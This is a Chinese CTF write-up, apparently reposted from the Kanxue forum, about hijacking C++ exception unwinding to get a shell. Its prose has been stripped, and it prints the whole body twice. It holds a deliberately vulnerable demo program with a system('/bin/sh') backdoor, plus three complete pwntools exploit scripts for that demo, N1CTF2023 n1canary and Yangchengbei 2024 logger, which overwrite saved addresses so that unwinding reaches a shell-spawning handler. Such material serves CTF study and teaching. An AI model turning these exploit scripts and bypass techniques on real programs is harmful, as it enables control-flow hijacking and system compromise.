# 分享C++ PWN 出题经历——深入研究异常处理机制

> 原文: https://www.ctfiot.com/220169.html
> ID: 220169

一

原理探究

// exception.cpp
// g++ exception.cpp -o exc -no-pie -fPIC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor()
{
 try
 {
 printf("We have never called this backdoor!");
 }
 catch (const char *s)
 {
 printf("[!] Backdoor has catched the exception: %sn", s);
 system("/bin/sh");
 }
}

class x
{
public:
 char buf[0x10];
 x(void)
 {
 // printf("x:x() called!n");
 }
 ~x(void)
 {
 // printf("x:~x() called!n");
 }
};

void input()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
 throw "Buffer overflow.";
 }
 printf("[+] input() return.n");
}

int main()
{
 try
 {
 input();
 printf("--------------------------------------n");
 throw 1;
 }
 catch (int x)
 {
 printf("[-] Int: %dn", x);
 }
 catch (const char *s)
 {
 printf("[-] String: %sn", s);
 }
 printf("[+] main() return.n");
 return 0;
}

Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)

ve1kcon@wsl:~$ cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
ve1kcon@wsl:~$ cyclic 56
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa

.got.plt:0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
.got.plt:0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
.got.plt:0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
.got.plt:0000000000404058 off_404058 dq offset __cxa_end_catch

void test()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
 throw "Buffer overflow.";
 }
 printf("[+] test() return.n");
}

void input()
{
 test();
 printf("[+] input() return.n");
}

void input()
{
 try
 {
 test();
 }
 catch (const char *s)
 {
 printf("[-] String(From input): %sn", s);
 }
 printf("[+] input() return.n");
}

.text:0000000000401283 lea rax, format ; "We have never called this backdoor!"
.text:000000000040128A mov rdi, rax ; format
.text:000000000040128D mov eax, 0
.text:0000000000401292 ; try {
.text:0000000000401292 call _printf
.text:0000000000401292 ; } // starts at 401292
.text:0000000000401297 jmp short loc_4012FF

from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './exc'
p = process(pwnfile)

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def exp():
 # debug('b *0x401371') # call _read 
 # b __cxa_throw@plt
 # b *0x401506 # handler ret
 # b *(&_Unwind_RaiseException+463) # check ret
 test = 'a'*5
 padding = 'a'*0x30
 # poc = padding + 'n'
 poc1 = padding + 'x01'
 poc2 = padding + p64(0x404050-0x8)
 poc3 = poc2 + 'b'*8
 poc4 = poc2 + p64(0x401292+1)
 p.sendafter('input:', poc4)

exp()
p.interactive()

二

N1CTF2023 - n1canary

Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)

int __fastcall main(int argc, const char **argv, const char **envp)
{
 __int64 v3; // rdx
 __int64 v4; // rax
 _QWORD v6[3]; // [rsp+0h] [rbp-18h] BYREF

 v6[1] = __readfsqword(0x28u);
 setbuf(stdin, 0LL, envp);
 setbuf(stdout, 0LL, v3);
 init_canary(); // canary init
 std::make_unique<BOFApp>((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
 v4 = std::unique_ptr<BOFApp>::operator->((__int64)v6); // v4 = v6
 (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::launch())
 std::unique_ptr<BOFApp>::~unique_ptr((__int64)v6);
 return 0;
}

__int64 init_canary(void)
{
 if ( getrandom(&sys_canary, 64LL, 0LL) != 64 )
 raise("canary init error");
 puts("To increase entropy, give me your canary");
 return readall<unsigned long long [8]>(&user_canary);
}

__int64 __fastcall ProtectedBuffer<64ul>::getCanary(unsigned __int64 a1)
{
 return user_canary[(a1 >> 4) & 7] ^ sys_canary[(a1 >> 4) & 7];
}

void __fastcall BOFApp::BOFApp(BOFApp *this)
{
 UnsafeApp::UnsafeApp(this);
 *(_QWORD *)this = off_4ED510;
}

__int64 __fastcall std::make_unique<BOFApp>(__int64 a1)
{
 BOFApp *v1; // rbx

 v1 = (BOFApp *)operator new(8uLL);
 *(_QWORD *)v1 = 0LL;
 BOFApp::BOFApp(v1);
 std::unique_ptr<BOFApp>::unique_ptr<std::default_delete<BOFApp>,void>(a1, v1);
 return a1;
}

pwndbg> x/20gx 0x4ed510+0x10
0x4ed520 <vtable for BOFApp+32>: 0x0000000000403552 0x0000000000000000

.data.rel.ro:00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
.data.rel.ro:00000000004ED510 ; DATA XREF: BOFApp::BOFApp(void)+16↑o
.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()+9↑o
.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()
.data.rel.ro:00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
.data.rel.ro:00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::launch(void)

__int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a2)
{
 __int64 result; // rax

 result = a2;
 if ( a2 )
 return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 8LL))(a2);
 return result;
}

__int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
 __int64 a1,
 __int64 a2,
 int a3,
 int a4,
 int a5,
 int a6)
{
 return _isoc23_scanf((unsigned int)"%[^n]", a2, a3, a4, a5, a6, a2, a1);
}

bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
{
 __int64 v1; // rbx
 bool result; // al

 v1 = *(_QWORD *)(a1 + 0x48);
 result = v1 != ProtectedBuffer<64ul>::getCanary(a1);
 if ( result )
 raise("*** stack smash detected ***");
 return result;
}

void __fastcall __noreturn raise(const char *a1)
{
 std::runtime_error *exception; // rbx

 puts(a1);
 exception = (std::runtime_error *)_cxa_allocate_exception(0x10uLL);
 std::runtime_error::runtime_error(exception, a1);
 _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::runtime_error, std::runtime_error::~runtime_error);
}

from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './n1canary'
p = process(pwnfile)

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def exp():
 # debug('b *0x403547')
 # b *0x40340D # Destructor
 # b *0x403909 # pointer call
 # b *0x403291 # raise->throw
 # b *0x403432 # <main+146> call std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()
 # b *0x4038fc
 backdoor = 0x403387
 user_canary = 0x4F4AA0
 payload = p64(user_canary+8) + p64(backdoor)*2
 payload = payload.ljust(0x40, 'a')
 p.sendafter('canaryn', payload)

 payload = 'a'*(0x70-0x8)
 payload += p64(0x403407) # ret
 # payload += 'a'*(0x8)
 payload += p64(user_canary) # BOFApp *v6
 # p.sendlineafter(' to pwn :)n', payload)

exp()
p.interactive()

三

2024年”羊城杯“粤港澳大湾区网络安全大赛 - logger

from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './pwn'
p = process(pwnfile)
# p = remote('', )

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def menu(index):
 p.sendlineafter('chocie:', str(index))

def trace(content='a', judge='n'):
 menu(1)
 p.sendlineafter('here: ', content)
 p.sendlineafter('records? ', judge)

def exp():
 # debug('b *$rebase(0x26A4)') # call _read
 # debug('b *$rebase(0x2582)')
 # b __cxa_throw@plt

 # payload = 'a'
 for i in range(7):
 trace()
 trace('a'*0x10,'n')
 payload = '/bin/sh;'
 trace(payload)

 menu(2)
 payload = 'a'*0x70
 payload += p64(0X404300)
 payload += p64(0x401BC2+1)
 p.sendafter('Type your message here plz: ', payload)

exp()
p.interactive()

看雪ID：ve1kcon

https://bbs.kanxue.com/user-home-977497.htm

*本文为看雪论坛精华文章，由 ve1kcon 原创，转载请注明来自看雪社区

# 往期推荐

1、Frida 逆向一个 APP

2、强网杯S8 Rust Pwn chat-with-me出题思路分享

3、浅析libc2.38版本及以前tcache安全机制演进过程与绕过手法

4、购物APP设备风控SDK-mtop简单分析

5、PWN入门：偷吃特权-SetUID

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
原理探究
```



```
// exception.cpp
// g++ exception.cpp -o exc -no-pie -fPIC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor()
{
 try
 {
 printf("We have never called this backdoor!");
 }
 catch (const char *s)
 {
 printf("[!] Backdoor has catched the exception: %sn", s);
 system("/bin/sh");
 }
}

class x
{
public:
 char buf[0x10];
 x(void)
 {
 // printf("x:x() called!n");
 }
 ~x(void)
 {
 // printf("x:~x() called!n");
 }
};

void input()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
 throw "Buffer overflow.";
 }
 printf("[+] input() return.n");
}

int main()
{
 try
 {
 input();
 printf("--------------------------------------n");
 throw 1;
 }
 catch (int x)
 {
 printf("[-] Int: %dn", x);
 }
 catch (const char *s)
 {
 printf("[-] String: %sn", s);
 }
 printf("[+] main() return.n");
 return 0;
}
```



```
Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
```



```
ve1kcon@wsl:~$ cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
ve1kcon@wsl:~$ cyclic 56
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
```



```
.got.plt:0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
.got.plt:0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
.got.plt:0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
.got.plt:0000000000404058 off_404058 dq offset __cxa_end_catch
```



```
void test()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
 throw "Buffer overflow.";
 }
 printf("[+] test() return.n");
}

void input()
{
 test();
 printf("[+] input() return.n");
}
```



```
void input()
{
 try
 {
 test();
 }
 catch (const char *s)
 {
 printf("[-] String(From input): %sn", s);
 }
 printf("[+] input() return.n");
}
```



```
.text:0000000000401283 lea rax, format ; "We have never called this backdoor!"
.text:000000000040128A mov rdi, rax ; format
.text:000000000040128D mov eax, 0
.text:0000000000401292 ; try {
.text:0000000000401292 call _printf
.text:0000000000401292 ; } // starts at 401292
.text:0000000000401297 jmp short loc_4012FF
```



```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './exc'
p = process(pwnfile)

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def exp():
 # debug('b *0x401371') # call _read 
 # b __cxa_throw@plt
 # b *0x401506 # handler ret
 # b *(&_Unwind_RaiseException+463) # check ret
 test = 'a'*5
 padding = 'a'*0x30
 # poc = padding + 'n'
 poc1 = padding + 'x01'
 poc2 = padding + p64(0x404050-0x8)
 poc3 = poc2 + 'b'*8
 poc4 = poc2 + p64(0x401292+1)
 p.sendafter('input:', poc4)

exp()
p.interactive()
```



```
二
N1CTF2023 - n1canary
```



```
Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
```



```
int __fastcall main(int argc, const char **argv, const char **envp)
{
 __int64 v3; // rdx
 __int64 v4; // rax
 _QWORD v6[3]; // [rsp+0h] [rbp-18h] BYREF

 v6[1] = __readfsqword(0x28u);
 setbuf(stdin, 0LL, envp);
 setbuf(stdout, 0LL, v3);
 init_canary(); // canary init
 std::make_unique<BOFApp>((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
 v4 = std::unique_ptr<BOFApp>::operator->((__int64)v6); // v4 = v6
 (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::launch())
 std::unique_ptr<BOFApp>::~unique_ptr((__int64)v6);
 return 0;
}
```



```
__int64 init_canary(void)
{
 if ( getrandom(&sys_canary, 64LL, 0LL) != 64 )
 raise("canary init error");
 puts("To increase entropy, give me your canary");
 return readall<unsigned long long [8]>(&user_canary);
}

__int64 __fastcall ProtectedBuffer<64ul>::getCanary(unsigned __int64 a1)
{
 return user_canary[(a1 >> 4) & 7] ^ sys_canary[(a1 >> 4) & 7];
}
```



```
void __fastcall BOFApp::BOFApp(BOFApp *this)
{
 UnsafeApp::UnsafeApp(this);
 *(_QWORD *)this = off_4ED510;
}
```



```
__int64 __fastcall std::make_unique<BOFApp>(__int64 a1)
{
 BOFApp *v1; // rbx

 v1 = (BOFApp *)operator new(8uLL);
 *(_QWORD *)v1 = 0LL;
 BOFApp::BOFApp(v1);
 std::unique_ptr<BOFApp>::unique_ptr<std::default_delete<BOFApp>,void>(a1, v1);
 return a1;
}
```



```
pwndbg> x/20gx 0x4ed510+0x10
0x4ed520 <vtable for BOFApp+32>: 0x0000000000403552 0x0000000000000000
```



```
.data.rel.ro:00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
.data.rel.ro:00000000004ED510 ; DATA XREF: BOFApp::BOFApp(void)+16↑o
.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()+9↑o
.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()
.data.rel.ro:00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
.data.rel.ro:00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::launch(void)
```



```
__int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a2)
{
 __int64 result; // rax

 result = a2;
 if ( a2 )
 return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 8LL))(a2);
 return result;
}
```



```
__int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
 __int64 a1,
 __int64 a2,
 int a3,
 int a4,
 int a5,
 int a6)
{
 return _isoc23_scanf((unsigned int)"%[^n]", a2, a3, a4, a5, a6, a2, a1);
}
```



```
bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
{
 __int64 v1; // rbx
 bool result; // al

 v1 = *(_QWORD *)(a1 + 0x48);
 result = v1 != ProtectedBuffer<64ul>::getCanary(a1);
 if ( result )
 raise("*** stack smash detected ***");
 return result;
}

void __fastcall __noreturn raise(const char *a1)
{
 std::runtime_error *exception; // rbx

 puts(a1);
 exception = (std::runtime_error *)_cxa_allocate_exception(0x10uLL);
 std::runtime_error::runtime_error(exception, a1);
 _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::runtime_error, std::runtime_error::~runtime_error);
}
```



```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './n1canary'
p = process(pwnfile)

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def exp():
 # debug('b *0x403547')
 # b *0x40340D # Destructor
 # b *0x403909 # pointer call
 # b *0x403291 # raise->throw
 # b *0x403432 # <main+146> call std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()
 # b *0x4038fc
 backdoor = 0x403387
 user_canary = 0x4F4AA0
 payload = p64(user_canary+8) + p64(backdoor)*2
 payload = payload.ljust(0x40, 'a')
 p.sendafter('canaryn', payload)

 payload = 'a'*(0x70-0x8)
 payload += p64(0x403407) # ret
 # payload += 'a'*(0x8)
 payload += p64(user_canary) # BOFApp *v6
 # p.sendlineafter(' to pwn :)n', payload)

exp()
p.interactive()
```



```
三
2024年”羊城杯“粤港澳大湾区网络安全大赛 - logger
```



```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
pwnfile = './pwn'
p = process(pwnfile)
# p = remote('', )

def debug(content=None):
 if content is None:
 gdb.attach(p)
 pause()
 else:
 gdb.attach(p, content)
 pause()

def menu(index):
 p.sendlineafter('chocie:', str(index))

def trace(content='a', judge='n'):
 menu(1)
 p.sendlineafter('here: ', content)
 p.sendlineafter('records? ', judge)

def exp():
 # debug('b *$rebase(0x26A4)') # call _read
 # debug('b *$rebase(0x2582)')
 # b __cxa_throw@plt

 # payload = 'a'
 for i in range(7):
 trace()
 trace('a'*0x10,'n')
 payload = '/bin/sh;'
 trace(payload)

 menu(2)
 payload = 'a'*0x70
 payload += p64(0X404300)
 payload += p64(0x401BC2+1)
 p.sendafter('Type your message here plz: ', payload)

exp()
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/0-1734431221.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/2-1734431222.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/7-1734431223.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1734431224.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/1-1734431225.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1734431225.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/7-1734431227.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1734431228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/6-1734431229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/1-1734431230.png)